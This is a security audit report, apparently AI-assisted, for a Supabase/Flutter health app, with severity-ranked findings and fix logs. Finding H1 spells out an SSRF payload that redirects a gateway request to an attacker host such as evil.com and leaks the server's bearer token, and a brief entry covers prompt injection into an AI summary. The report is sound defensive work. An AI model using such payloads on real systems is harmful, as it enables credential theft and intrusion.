# Ayulekha — Full-Codebase Security Review

**Date:** 2026-07-19
**Scope:** Whole repository (not just recent diffs) + git history.
**Method:** Six specialized review passes (injection, auth/access-control, secrets, supply-chain, data-handling, infra/config) following the "Boris Cherny style" audit prompt. Top findings live-verified against source.
**Status:** Audit complete. **Pass-1 fixes applied 2026-07-19** (see fix log below); remaining items backlogged.

### Fix log — pass 1 (applied, not yet deployed)
| Ref | Fix | Change |
|-----|-----|--------|
| H1 | Deleted the `abdm-gateway` `raw` passthrough action | `supabase/functions/abdm-gateway/index.ts` |
| H2 | Column-scoped `doctors` SELECT grant to exclude `pin_hash` | `supabase/migrations/0031_doctors_pin_hash_grant.sql` |
| H3/M5 | `abdm-callback` no longer logs the request body (size only) | `supabase/functions/abdm-callback/index.ts` |
| H4 | `pubspec.lock` un-ignored and committed | `.gitignore` |
| M1 | `REQUIRE_OTP` now defaults **on** (fails closed) | `supabase/functions/mint-scope-token/index.ts` |

**⚠ Deploy note (M1):** the demo Supabase project must have `REQUIRE_OTP=false` set in the `mint-scope-token` function secrets **before** these changes deploy, or the demo phone-only logins will stop working. To deploy: `supabase db push` (migration 0031) + `supabase functions deploy abdm-gateway abdm-callback mint-scope-token`.

### Fix log — pass 2 (applied 2026-07-19, not yet deployed)
| Ref | Fix | Change |
|-----|-----|--------|
| M2 | Rate-limit key now uses a trusted client IP (`x-real-ip`, else the LAST `x-forwarded-for` hop) instead of the spoofable first token | `mint-scope-token/index.ts` (`clientIp` helper) |
| M3 | Token endpoint no longer answers `Access-Control-Allow-Origin: *` — echoes only an allowlisted origin (`ALLOWED_ORIGINS` secret; defaults to localhost:5000). Non-browser clients unaffected | `mint-scope-token/index.ts` (`corsFor`) |
| M7 (partial) | Removed the two `esm.sh` CDN rebundler imports → `npm:@supabase/supabase-js@2` (all four functions now consistent) | `mint-scope-token`, `branding-upload` |

**⚠ Deploy note (M3):** set `ALLOWED_ORIGINS` (comma-separated web origins, e.g. the deployed app URL) in the `mint-scope-token` secrets before prod; the built-in default only covers `localhost:5000`.

### Fix log — pass 3 (applied 2026-07-19)
| Ref | Fix | Change |
|-----|-----|--------|
| M6 | 8 static font weights (Figtree R/M/SemiBold/Bold/ExtraBold + Noto Sans R/M/Bold) bundled under `app/assets/google_fonts/`; `GoogleFonts.config.allowRuntimeFetching = false` in `main()` — no runtime `fonts.gstatic.com` fetch | `app/pubspec.yaml`, `app/lib/main.dart`, `app/assets/google_fonts/*` |
| M7 | Committed `supabase/functions/deno.lock` (integrity hashes; resolved supabase-js 2.110.7). `@2` + lockfile = reproducible; the CDN rebundler is already gone (pass 2) | `supabase/functions/deno.lock` |

**M6 verification:** `flutter build web --release` succeeds with runtime fetching off and all 8 TTFs present in `build/web/assets/assets/google_fonts/`. Runtime proof (load offline → no `fonts.gstatic.com` request in the Network tab) to confirm in-browser.

### Fix log — pass 4 (Lows, applied 2026-07-19)
| Ref | Fix | Change |
|-----|-----|--------|
| L1 | `carebridge_log_view` now refuses to write an access-log row unless `current_scope_can_view_patient()` passes — no more forged audit entries for arbitrary patients | `migrations/0032_consent_low_findings.sql` |
| L2 | `scope` (PIN-verify) action added to the per-IP rate limiter | `mint-scope-token/index.ts` |
| L4 | CSP + `X-Content-Type-Options` meta added to the web shell (`frame-ancestors 'none'`, `object-src 'none'`, `base-uri 'self'`, scripts/connect restricted). **Verified in-browser: app mounts, 0 CSP violations** | `app/web/index.html` |
| L5 | Partner-supplied `structured_values` deep-clipped (string leaves capped, breadth/depth bounded, oversized blob dropped) before reaching the AI prompt | `ai-summary/index.ts` |
| L6 | `carebridge_request_access` sends the patient notification only when a NEW pending request is created — repeat calls no longer spam | `migrations/0032_consent_low_findings.sql` |
| L3 | **Accepted, no change** — `branding` bucket is public-read but holds only non-PHI logos/photos. Revisit (private + signed URLs) only if hotlinking/enumeration becomes a concern | — |

**⚠ BUILD-FLAG REQUIREMENT (from L4):** the committed CSP forbids off-origin script/wasm, and Flutter otherwise (a) generates code dynamically and (b) fetches CanvasKit from `gstatic.com`. Web builds **must** therefore use:
```
flutter build web --release --csp --no-web-resources-cdn
```
`--csp` produces a CSP-safe bundle; `--no-web-resources-cdn` loads CanvasKit from the app's own bundle (also removes that CDN dependency). A plain `flutter build web --release` will render a **blank screen** under this CSP. (The engine's Roboto fallback still tries gstatic and is harmlessly blocked — bundled Noto Sans/Figtree render all text.)

Still open: demo/before-prod items in §3. Note: `branding-upload` still uses `*` CORS — left intentionally (returns only a public URL, no token/PII — low stakes). **All six Mediums (M1–M7) and all actionable Lows (L1, L2, L4, L5, L6) are now resolved; L3 accepted.**

> Authority for "intended behavior" is `CLAUDE.md` Section 7 (consent/access-grant model) and Section 2 (session scoping). Demo/non-prod posture is per the `founder-prelaunch-sequencing` decision (no company yet; DLT/ABDM/OTP deferred until incorporation).

---

## How to read this

- **Severity:** Critical / High / Medium / Low.
- **DEMO?** = "Yes" means the issue exists **only because of a deliberate non-prod demo shortcut**. These are not bugs today — they are **must-flip-before-prod** items, not fix-now items.
- Every finding cites `file:line` and a verification/repro path.

---

## 1. Findings

### 🔴 HIGH

#### H1 — SSRF + ABDM token exfiltration via `abdm-gateway` `raw` action
- **Location:** `supabase/functions/abdm-gateway/index.ts:344-355`
- **DEMO?** No (real code path).
- **Detail:** `path`, `method`, `extra_headers`, `body` are all caller-controlled; the request attaches the live ABDM gateway session bearer token. `fetch(`${BASE}${path}`)` allows host takeover via URL-userinfo (`path=@evil.com/x` → real host `evil.com`). `verify_jwt=true` but there is **no role check**, so any authenticated patient/doctor can call it. The code comment at `config.toml:32` explicitly notes this action "must be gated to an admin/founder session before production" — never implemented.
- **Exploit:** Any patient JWT → `{"action":"raw","path":"@collector/x"}` → server leaks its ABDM `Authorization: Bearer` token to the attacker's host; can also pivot to internal egress-reachable endpoints.
- **Fix:** Delete the `raw` action (onboarding-diagnostics only) **or** allowlist `path` (`^/…`, reject `@`, `//`, `\`) and require a founder/admin role.
- **Verify:** As an ordinary patient JWT, call with `path` pointing at a collector you control; confirm it receives a request bearing an ABDM bearer token. After fix: 403 / rejected.

#### H2 — Doctor `pin_hash` readable by every clinic session (column-level over-grant)
- **Location:** `supabase/migrations/0003_rls_policies.sql:17` (column added in `0004_pin_auth.sql:31`)
- **DEMO?** No.
- **Detail:** `grant select on ... doctors ... to authenticated` is table-wide. RLS filters *rows*, not *columns*, so any clinic session that can see a doctor row also reads that doctor's `pin_hash` (bcrypt of a short 4–6 digit PIN — offline-crackable).
- **Exploit:** Admin/front-desk or doctor A selects `pin_hash` for doctor B → cracks the short PIN offline → `mint-scope-token` `scope` as doctor B → **writes prescriptions under B's clinical identity**, defeating the clinical-accountability rule (CLAUDE.md §2.2, §10).
- **Fix:** Grant SELECT on an explicit column list excluding `pin_hash` (and ideally `phone`), or drop the raw grant and read doctors only through existing SECURITY DEFINER RPCs.
- **Verify:** As a scoped clinic JWT, `GET /rest/v1/doctors?select=id,pin_hash` — currently returns hashes; after fix returns an error / no column.

#### H3 — `abdm-callback` open webhook: no signature verification, logs raw body
- **Location:** `supabase/config.toml:38-39` (`verify_jwt=false`) + `supabase/functions/abdm-callback/index.ts:29`
- **DEMO?** Partial — the endpoint is a **stub** today (ABDM integration is incorporation-blocked), so there is no real consent data flowing yet. The open+unsigned+body-logging posture must be fixed before the real HIP/HIU handlers land here.
- **Detail:** Public by necessity (ABDM has no Supabase JWT), but there is no HMAC/signature check and it logs up to 800 chars of attacker-controlled body.
- **Exploit today:** Log flooding / log-injection (cost/DoS). **Before prod:** forged consent/data-request callbacks once handlers are implemented.
- **Fix:** Verify ABDM's request signature/HMAC against the shared secret before processing; reject unsigned with 401; stop logging the raw body (method+path+status only).
- **Verify:** `curl -X POST .../abdm-callback -d '{"x":1}'` currently returns 202; after fix an unsigned body returns 401.

#### H4 — `pubspec.lock` is gitignored (non-reproducible Flutter builds)
- **Location:** `.gitignore:25`
- **DEMO?** No.
- **Detail:** All 11 direct Dart deps use caret (`^`) ranges and the lockfile is not committed, so a fresh `flutter pub get` can resolve a backdoored patch/minor of any dependency with no pinned record. (The `website/` project correctly commits its `package-lock.json` — inconsistent posture.)
- **Fix:** Remove `app/pubspec.lock` from `.gitignore` and commit it.
- **Verify:** `git check-ignore app/pubspec.lock` prints nothing; `git ls-files app/pubspec.lock` lists it.

---

### 🟡 MEDIUM

#### M1 — `REQUIRE_OTP=false` default → phone-number-only login
- **Location:** `supabase/functions/mint-scope-token/index.ts:42,170,348`
- **DEMO?** **YES — deliberate pre-incorporation posture.** Documented in the `founder-prelaunch-sequencing` decision (no OTP until DLT/MSG91 after incorporation).
- **Detail:** With default `REQUIRE_OTP=false` and no `otp_code`, `patient_login` and clinic/doctor `login` authenticate on phone number **alone** and return a full session (`placeholder:true`). Anyone who knows a mobile number logs in as that person.
- **Before-prod action:** Set `REQUIRE_OTP=true` and wire real OTP. Recommend flipping the **default to true** so it fails closed if the env var is unset.
- **Verify:** `patient_login` with a valid phone and no `otp_code` currently returns tokens; with OTP required it must return 401.

#### M2 — Rate limiter bypassable via spoofed `x-forwarded-for`
- **Location:** `supabase/functions/mint-scope-token/index.ts:112`
- **DEMO?** No.
- **Detail:** Rate key uses the first, client-settable `x-forwarded-for` token, so rotating the header yields a fresh bucket, defeating the 20/10-min throttle on login/OTP-send.
- **Fix:** Derive client IP from the trusted platform value, not the first XFF token.
- **Verify:** 50 login calls varying `X-Forwarded-For` — all should still hit 429 after the cap.

#### M3 — Wildcard CORS `*` on the token-minting endpoint
- **Location:** `supabase/functions/mint-scope-token/index.ts:67` (also present on other functions — lower stakes there)
- **DEMO?** No.
- **Detail:** Any website in a victim's browser can call OTP/login actions and read `access_token`/`refresh_token` in the JSON response.
- **Fix:** Echo an allowlist of known app origins instead of `*` on token-minting/auth functions.
- **Verify:** Request with `Origin: https://evil.com` should not receive `Access-Control-Allow-Origin: *`.

#### M4 — Live secrets in local `.env` pending rotation (git history is CLEAN)
- **Location:** repo-root `.env` (service-role key, DB password, Groq key, Supabase access token, cron secret)
- **DEMO?** No — operational hygiene.
- **Detail:** Git history scan (68 commits, all refs) confirms **no secret value was ever committed**; `.env` is correctly gitignored. An old service_role key was once briefly committed then history-scrubbed (`docs/security-key-migration.md`) and is reportedly revoked/inert.
- **Before-prod action:** Rotate all five secrets post-pilot; confirm in the Supabase dashboard that the legacy HS256 secret + old key remain disabled.
- **Verify:** `git log --all --oneline -- .env` is empty (confirmed); dashboard shows old keys revoked.

#### M5 — `abdm-callback` logs raw request body (PII in logs)
- **Location:** `supabase/functions/abdm-callback/index.ts:29`
- **DEMO?** Partial (see H3 — same endpoint, stub today).
- **Detail:** Once real callbacks flow, health identifiers/consent artefacts land in Supabase logs. (Note: the **gateway** never logs Aadhaar/OTP — ID-6 upheld, verified.)
- **Fix:** Log method + path + status only.

#### M6 — `google_fonts` fetches fonts from Google CDN at runtime
- **Location:** `app/pubspec.yaml:31`
- **DEMO?** No.
- **Detail:** Default behavior makes a per-client request to `fonts.gstatic.com`, a third-party CDN dependency + privacy signal inappropriate for a health app under DPDP.
- **Fix:** Bundle fonts as assets and set `GoogleFonts.config.allowRuntimeFetching = false;` at startup.
- **Verify:** Run offline; fonts render and no request to `fonts.gstatic.com` appears.

#### M7 — Edge-function dependency pinning
- **Location:** `mint-scope-token/index.ts:26`, `branding-upload/index.ts:15` (esm.sh); floating `@2` in all four functions; no committed `deno.lock`.
- **DEMO?** No.
- **Detail:** Two security-relevant functions import supabase-js from the `esm.sh` CDN; all four use a floating major (`@2`) with no integrity lockfile.
- **Fix:** Standardize on `npm:@supabase/supabase-js@2.x` (pinned) and commit `deno.lock`.

---

### 🟢 LOW

| # | Finding | Location | DEMO? | Note |
|---|---------|----------|-------|------|
| L1 | `carebridge_log_view` lets a session write access-log rows for arbitrary patient_ids (no `can_view_patient` check) — undermines the "who viewed my records" audit guarantee | `0009_consent_flows.sql:244` | No | Add the visibility check before insert |
| L2 | `scope` PIN-verify action omitted from the IP rate-limiter (per-identity lockout still applies) | `mint-scope-token/index.ts:109` | No | Add `"scope"` to the throttled list |
| L3 | `branding` bucket is public-read + path-enumerable (non-PHI logos/photos only) | `0030_doctor_branding.sql:11` | No | Acceptable; make private + signed URLs if hotlinking matters |
| L4 | No security headers (CSP / HSTS / X-Frame-Options) on the web shell | `app/web/index.html` | No | Add via hosting layer + a `<meta>` CSP floor |
| L5 | Partner `structured_values` reach the AI summary un-clipped (low-grade prompt-injection into narrative only) | `ai-summary/index.ts:152` | No | Clip/escape length; summary is labeled "verify against record" |
| L6 | `carebridge_request_access` allows unsolicited request-notifications to any patient_id (nuisance, no data leak) | `0009_consent_flows.sql:152` | No | Rate-limit / dedupe requests |
| L7 | Demo PIN `1234` hardcoded in seed migration | `0028_partner_auth.sql:19` | **YES** | Remove/gate demo seed before prod onboarding |

---

## 2. Verified sound (notable — the core trust model holds)

- **Consent model (Section 7) is correctly enforced at the DB level:** doctor-scope isolation, admin AC-8 inherited visibility, and Flow-C order-scoped grants all check active / non-revoked / non-expired grants. Scope claims come only from `scope_sessions` via the custom access-token hook and **cannot be client-forged**.
- **Medical reports bucket is private**, served via grant-gated **signed URLs** — no IDOR on the highest-stakes data (lab PDFs / scans).
- **No SQL or command injection** anywhere (no dynamic SQL in any RPC).
- **No XSS** surface (Flutter renders to canvas/widgets; `structured_values` shown as plain text).
- **PIN brute-force lockout** (5 strikes / 15 min, per-identity) covers all three roles.
- **RLS enabled on every table**; **realtime** publications (`appointments`, `notifications`) expose only self-scoped rows.
- **Aadhaar / OTP never persisted or logged** anywhere (ID-6 upheld); gateway RSA-encrypts Aadhaar in transit.
- **Git history is clean** of secret values.

---

## 3. Demo / non-prod items (must flip before production)

These are **not defects** — they are deliberate pre-incorporation shortcuts. Consolidated here so nothing is forgotten at launch:

| Ref | Item | Before-prod action |
|-----|------|--------------------|
| M1 | `REQUIRE_OTP=false` phone-only login | Set `REQUIRE_OTP=true`; wire MSG91/DLT OTP; default to fail-closed |
| L7 | Demo PIN `1234` + demo phones seeded in migrations | Remove/gate demo seed data behind a non-prod flag |
| H3/M5 | `abdm-callback` stub (open, unsigned, body-logged) | Implement signature verification + drop body logging when real ABDM handlers land |
| M4 | Live dev secrets in local `.env` | Rotate all secrets at pilot→prod cutover; confirm old keys revoked |
| — | Founder-manual hospital/lab verification (Supabase dashboard) | Ship the in-app verification screen (also in KNOWN_ISSUES backlog) |

---

## 4. Prioritized fix list (recommendation)

**Fix now (this pass)** — small, high-impact, no external dependency:
1. **H1** — remove/gate `abdm-gateway` `raw` action.
2. **H2** — column-scope the `doctors` SELECT grant to exclude `pin_hash`.
3. **H4** — commit `pubspec.lock`.
4. **H3** — stop `abdm-callback` from logging the raw body now; add signature verification when handlers are built (track as before-prod).
5. **M1** — flip the `REQUIRE_OTP` **default** to fail-closed (keep env override for demo).

**Next batch (follow-up PR):** M2, M3, M6, M7, L1, L2.

**Backlog / accept:** L3, L4, L5, L6; L7 + remaining demo items tracked in §3 for the prod cutover checklist.

**Blocked on incorporation (do not attempt now):** real OTP/DLT (M1 fully), ABDM production keys + `abdm-callback` handlers (H3/M5), secret rotation (M4).

---

## 5. Standing process (Step 5 of the audit prompt — mandatory)

A "Security Review Checklist" section covering these six categories will be added to `CLAUDE.md` (and its `AGENTS.md` copy) so every future change is checked against the same list. *(To be done after fixes are approved.)*
